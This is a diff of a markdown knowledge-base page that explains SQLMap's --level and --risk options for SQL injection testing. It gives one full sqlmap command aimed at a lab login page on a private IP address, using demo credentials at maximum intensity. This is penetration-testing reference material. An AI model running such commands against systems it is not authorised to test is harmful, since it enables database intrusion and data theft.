@@ -32,15 +32,29 @@ SQLMap is an automated SQL injection testing tool. The tool can be used to test 
 
 SQLMap is an automated SQL injection testing tool. The tool can be used to test with different levels of payloads. *--level* and *--risk *options can be used to specify the intensity of scan.
 
+
+
 # Procedure
 
+
+
 1. Use the following SQLMap command to exploit SQL injection on the application with level and risk options.
+
+
+
+
+
+
 
 **Command** ([[SQLMap to Perform SQL Injection With Intense Level]]):
 
 ```bash
 sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass=demo&selop=2' --level=5 --risk=3
 ```
+
+
+
+
 
 ## Platforms
 
@@ -57,3 +71,5 @@ sqlmap -u 'http://192.168.1.10/vcart/login.php' --data='user=demo@vcart.com&pass
 - [[sqli]]
 - [[SQLMap]]
 - [[Web Applications]]
+
+
